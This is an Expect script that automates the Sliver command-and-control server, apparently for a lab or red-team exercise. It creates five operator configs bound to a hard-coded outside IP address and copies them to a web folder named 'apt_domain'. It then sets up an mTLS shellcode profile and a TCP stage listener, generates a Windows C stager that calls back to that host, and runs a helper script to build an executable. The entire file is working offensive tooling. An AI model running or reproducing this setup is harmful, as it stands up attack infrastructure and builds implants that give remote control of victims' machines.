#!/usr/bin/expect

set path "./tools/sliver/client_configs/"
set names {"20120078" "20120083" "20120116" "20120176" "20120313"}

set destFolder1 "/var/www/apt_domain/configs/"
set destFolder2 "/home/kali/.sliver-client/configs/"

set payload_c "./data/payloads/win_stager.c"

# Check if the folder exists, create it if not
if {![file isdirectory $path]} {
    if {[catch {file mkdir $path} error]} {
        puts "Error creating folder: $error"
        exit 1
    }
}
sleep 0.1

spawn sliver-server

# Wait for sliver-server to start (you can adjust the sleep duration as needed)
sleep 0.1

foreach name $names {

    # Send commands to create a new operator and save its configuration
    send "new-operator --name $name --lhost 18.143.102.216 --lport 31337 --save $path\r"

    # Add a delay between iterations if needed
    sleep 0.1
}

# Add a delay to make sure the new operators are created
sleep 0.1

# Continue using sliver-server
send "multiplayer\r"
send "operators\r"

# Generate stager
send "profiles new --mtls 18.143.102.216:8080 --skip-symbols --format shellcode --arch amd64 win64\r"
send "stage-listener --url tcp://18.143.102.216:1234 --profile win64\r"
send "jobs\r"
send "generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format c --save $payload_c\r"

# create .exe file from another .sh file
./tools/sliver/exe_from_c.sh

# Enter interactive mode, allowing you to manually interact with sliver-server
interact